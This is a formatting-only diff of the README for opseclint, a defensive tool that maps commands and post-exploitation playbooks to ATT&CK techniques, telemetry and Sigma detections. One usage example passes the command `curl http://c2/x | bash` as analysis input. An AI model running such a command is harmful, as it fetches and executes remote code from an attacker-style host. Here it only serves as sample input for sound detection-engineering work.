@@ -1,4 +1,5 @@
 <!-- Back to top anchor -->
+
 <a id="readme-top"></a>
 
 <!-- PROJECT SHIELDS -->
@@ -21,7 +22,7 @@
   <h1 align="center">🛡️ opseclint</h1>
 
   <p align="center">
-    A detection-coverage analyzer for the command line — <em>“what would a defender see?”</em>
+    A detection-coverage analyzer for the command line. <em>“what would a defender see?”</em>
     <br />
     <a href="#usage"><strong>Explore the docs »</strong></a>
     <br />
@@ -74,12 +75,13 @@
 </details>
 
 <!-- ABOUT THE PROJECT -->
+
 ## About The Project
 
 **opseclint** points at a command, a script, or a post-exploitation playbook and
 statically resolves each action to the [MITRE ATT&CK][attack-url] technique(s) it
-implements, the host telemetry it emits, and the detections that would fire —
-each with a detectability score. It answers one question: **“what would a
+implements, the host telemetry it emits, and the detections that would fire.
+Each with a detectability score. It answers one question: **“what would a
 defender see?”** across **Linux/auditd**, **Windows/Sysmon**, and **macOS/Endpoint
 Security**.
 
@@ -97,19 +99,19 @@ opseclint — detection-coverage report (linux-auditd)
 summary  loudest action: CRITICAL (82)
 ```
 
-### Who it's for
+### Who it's designed for
 
-- **Detection engineers** validating coverage — “if an operator ran this, would
+- **Detection engineers** validating coverage. “If an operator ran this, would
   my ruleset catch it, and with what telemetry?”
 - **Purple teams** mapping an engagement's actions to expected detections.
 - **Red teams** (under authorization) reasoning about a playbook's telemetry
   footprint.
 
 > [!NOTE]
-> opseclint describes **detectability** — the defensive signal an action
+> opseclint describes **detectability**, or the defensive signal an action
 > generates. It is **not** an evasion tool: it does not recommend “quieter”
 > alternatives. Absence of a finding means only that nothing in the knowledge
-> base matched — never that an action is stealthy.
+> base matched, and never that an action is stealthy.
 
 ### Built With
 
@@ -121,11 +123,12 @@ summary  loudest action: CRITICAL (82)
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
 <!-- GETTING STARTED -->
+
 ## Getting Started
 
 ### Prerequisites
 
-Nothing at runtime — opseclint ships as a single self-contained binary. To build
+Nothing at runtime. `opseclint` ships as a single self-contained binary. To build
 from source you need a stable [Rust][rust-url] toolchain (edition 2024).
 
 ### Installation
@@ -141,7 +144,7 @@ from the [Releases][releases-url] page, or build from a checkout:
 cargo build --release            # -> target/release/opseclint
 ```
 
-**Docker** — a tiny (~750 KB, `scratch`-based) image is published to GHCR:
+**Docker**: a tiny (~750 KB, `scratch`-based) image is published to GHCR:
 
 ```bash
 docker run --rm -v "$PWD":/work ghcr.io/gerrrt/opseclint /work/script.sh
@@ -151,6 +154,7 @@ docker run --rm ghcr.io/gerrrt/opseclint -c 'curl http://c2/x | bash'
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
 <!-- USAGE -->
+
 ## Usage
 
 ```bash
@@ -172,11 +176,11 @@ opseclint script.sh --ci --threshold 70   # exit 1 if loudest action >= 70
 
 Select the host telemetry model with `--platform` (default `linux-auditd`):
 
-| Platform          | Telemetry model                                   |
-|-------------------|---------------------------------------------------|
-| `linux-auditd`    | Linux with auditd / EDR syscall events            |
-| `windows-sysmon`  | Windows with Sysmon (Event IDs) / Security log    |
-| `macos-es`        | macOS with Endpoint Security (ESF) / unified log  |
+| Platform         | Telemetry model                                  |
+| ---------------- | ------------------------------------------------ |
+| `linux-auditd`   | Linux with auditd / EDR syscall events           |
+| `windows-sysmon` | Windows with Sysmon (Event IDs) / Security log   |
+| `macos-es`       | macOS with Endpoint Security (ESF) / unified log |
 
 Each platform has its own embedded knowledge base, so `whoami` resolves to Linux
 `execve()` telemetry, a Windows Sysmon EID 1, or a macOS ESF `NOTIFY_EXEC`
@@ -186,11 +190,11 @@ filtered to the platform's `logsource.product`.
 
 ### Real Sigma rules
 
-By default, detection references in the seed KB are *representative*. Point
+By default, detection references in the seed KB are _representative_. Point
 `--sigma` at a checkout of [SigmaHQ/sigma][sigma-url] (or any directory of Sigma
 YAML) and opseclint indexes every rule by its ATT&CK technique tag, then replaces
-each finding's references with the **genuine rule titles and UUIDs** that match —
-platform-relevant rules only.
+each finding's references with the **genuine rule titles and UUIDs** that match.
+Platform-relevant rules only.
 
 ```bash
 git clone --depth 1 https://github.com/SigmaHQ/sigma
@@ -213,7 +217,7 @@ bypasses it.
 
 Beyond technique-tag matching, opseclint can evaluate a command against a Sigma
 rule's actual `detection:`/`condition:` logic and report, per command, whether it
-**FIRES**, **NO-FIRE**s, or is **INDETERMINATE** — the last meaning the rule keys
+**FIRES**, **NO-FIRE**s, or is **INDETERMINATE**. The last meaning the rule keys
 on a field a static analyzer can't synthesize (e.g. `ParentImage`, a hash), so
 opseclint honestly abstains rather than guess.
 
@@ -229,7 +233,7 @@ sigma rule check: Docker Socket Access Via Curl Or Wget (85f46916-…)
 ### Coverage gaps (`--coverage-gaps`)
 
 The headline purple-team feature: given a playbook and a real `--sigma` ruleset,
-report the **blind spots** — actions whose ATT&CK techniques *have* rules, yet
+report the **blind spots**, or actions whose ATT&CK techniques _have_ rules, yet
 none of those rules actually fire on the specific command.
 
 ```console
@@ -267,11 +271,11 @@ analyzes a path in CI (Linux runners):
 - uses: Gerrrt/opseclint@v0.1.1
   with:
     path: examples/
-    platform: linux-auditd       # or windows-sysmon | macos-es
-    fail-threshold: "75"         # optional: fail the job on a loud action
-    sarif-file: opseclint.sarif  # optional: emit SARIF...
+    platform: linux-auditd # or windows-sysmon | macos-es
+    fail-threshold: "75" # optional: fail the job on a loud action
+    sarif-file: opseclint.sarif # optional: emit SARIF...
 
-- uses: github/codeql-action/upload-sarif@v3   # ...then upload it
+- uses: github/codeql-action/upload-sarif@v3 # ...then upload it
   with:
     sarif_file: opseclint.sarif
 ```
@@ -281,12 +285,12 @@ analyzes a path in CI (Linux runners):
 A 0–100 estimate of how strongly an action surfaces in defensive telemetry
 (higher = louder), bucketed as:
 
-| Score  | Severity  |
-|--------|-----------|
-| 0–24   | LOW       |
-| 25–49  | MEDIUM    |
-| 50–74  | HIGH      |
-| 75–100 | CRITICAL  |
+| Score  | Severity |
+| ------ | -------- |
+| 0–24   | LOW      |
+| 25–49  | MEDIUM   |
+| 50–74  | HIGH     |
+| 75–100 | CRITICAL |
 
 `--ci` turns this into a gate: it exits non-zero when the loudest modeled action
 meets or exceeds `--threshold`, so a team can fail a pipeline on tradecraft that
@@ -294,22 +298,22 @@ exceeds an agreed noise budget.
 
 ### How it works
 
-1. **Parser** (`parser.rs`) — quote-aware tokenizer that strips comments and
+1. **Parser** (`parser.rs`): quote-aware tokenizer that strips comments and
    `VAR=value` assignments, splits on control operators, unwraps `sudo`/`env`/…,
    and resolves each segment to a program + arguments. A preprocessing pass joins
    line continuations, resolves commands hidden in `$(...)`/backtick
    substitutions, and handles here-docs (body skipped as data unless it feeds a
    shell interpreter).
-2. **Knowledge base** (`data/knowledge*.json`) — one KB per platform; each entry
+2. **Knowledge base** (`data/knowledge*.json`): one KB per platform; each entry
    maps a command (or a raw pattern) to ATT&CK techniques, the telemetry it
    emits, representative Sigma-style detections, and a detectability score.
-3. **Analyzer** (`analyzer.rs`) — matches every action against the KB,
+3. **Analyzer** (`analyzer.rs`): matches every action against the KB,
    deduplicates per line, and ranks findings loudest-first.
-4. **Report** (`report.rs`) — terminal, JSON, or SARIF output, plus the CI gate.
+4. **Report** (`report.rs`): terminal, JSON, or SARIF output, plus the CI gate.
 
 All KBs are embedded at compile time, so opseclint ships as a single static
 binary with no runtime dependencies. Adding coverage is a data change, not a code
-change — see [CONTRIBUTING.md](CONTRIBUTING.md).
+change. See [CONTRIBUTING.md](CONTRIBUTING.md).
 
 Try it against the [`examples/`](examples/) playbooks:
 
@@ -324,14 +328,15 @@ opseclint examples/macos-postex.sh    --platform macos-es        # keychain, Gat
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
 <!-- ROADMAP -->
+
 ## Roadmap
 
-- [x] Three platforms — Linux/auditd, Windows/Sysmon, macOS/Endpoint Security
+- [x] Three platforms: Linux/auditd, Windows/Sysmon, macOS/Endpoint Security
 - [x] Real SigmaHQ enrichment with an on-disk cache
 - [x] SARIF output → GitHub code scanning
-- [x] Distribution — crates.io, prebuilt binaries, a GitHub Action, and a GHCR image
-- [x] [Sigma rule-logic evaluator](docs/design/rule-logic-evaluator.md) — three-valued `FIRES` / `NO-FIRE` / `INDETERMINATE`, via `--check-rule`
-- [x] `--coverage-gaps` — flag actions whose techniques have rules but where none fire
+- [x] Distribution: crates.io, prebuilt binaries, a GitHub Action, and a GHCR image
+- [x] [Sigma rule-logic evaluator](docs/design/rule-logic-evaluator.md): three-valued `FIRES` / `NO-FIRE` / `INDETERMINATE`, via `--check-rule`
+- [x] `--coverage-gaps`: flag actions whose techniques have rules but where none fire
 - [ ] Deepen each KB and add EDR-specific telemetry mappings
 
 See the [open issues][issues-url] for the full list, and
@@ -340,11 +345,12 @@ See the [open issues][issues-url] for the full list, and
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
 <!-- CONTRIBUTING -->
+
 ## Contributing
 
 Contributions make the open-source community an amazing place to learn and
 create. The most valuable contributions here are **new detection coverage** and
-**false-positive/negative fixes** — most of which are data changes, not code.
+**false-positive/negative fixes** (most of which are data changes, not code).
 
 1. Fork the project
 2. Create your feature branch (`git checkout -b feat/amazing-coverage`)
@@ -360,6 +366,7 @@ conventions. By participating you agree to the
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
 <!-- LICENSE -->
+
 ## License
 
 Distributed under the MIT License. See [`LICENSE`](LICENSE) for more information.
@@ -367,6 +374,7 @@ Distributed under the MIT License. See [`LICENSE`](LICENSE) for more information
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
 <!-- CONTACT -->
+
 ## Contact
 
 Garrett Allen — [@Gerrrt](https://github.com/Gerrrt)
@@ -376,11 +384,11 @@ Project Link: [https://github.com/Gerrrt/opseclint](https://github.com/Gerrrt/op
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
 <!-- ACKNOWLEDGMENTS -->
+
 ## Acknowledgments
 
 - [MITRE ATT&CK][attack-url] — the technique taxonomy opseclint maps to
 - [SigmaHQ][sigma-url] — the open detection-rule standard behind `--sigma`
-- [Best-README-Template](https://github.com/othneildrew/Best-README-Template) — this README's structure
 
 <p align="right">(<a href="#readme-top">back to top</a>)</p>
 
@@ -389,6 +397,7 @@ Project Link: [https://github.com/Gerrrt/opseclint](https://github.com/Gerrrt/op
 > rely on them.
 
 <!-- MARKDOWN LINKS & IMAGES -->
+
 [crates-shield]: https://img.shields.io/crates/v/opseclint?style=flat-square&logo=rust&label=crates.io&color=E37602
 [crates-url]: https://crates.io/crates/opseclint
 [downloads-shield]: https://img.shields.io/crates/d/opseclint?style=flat-square&logo=rust&label=downloads
@@ -406,7 +415,6 @@ Project Link: [https://github.com/Gerrrt/opseclint](https://github.com/Gerrrt/op
 [license-shield]: https://img.shields.io/github/license/Gerrrt/opseclint?style=flat-square
 [license-url]: https://github.com/Gerrrt/opseclint/blob/main/LICENSE
 [releases-url]: https://github.com/Gerrrt/opseclint/releases
-
 [rust-shield]: https://img.shields.io/badge/Rust-000000?style=flat-square&logo=rust&logoColor=white
 [rust-url]: https://www.rust-lang.org
 [attack-shield]: https://img.shields.io/badge/MITRE_ATT%26CK-C1272D?style=flat-square
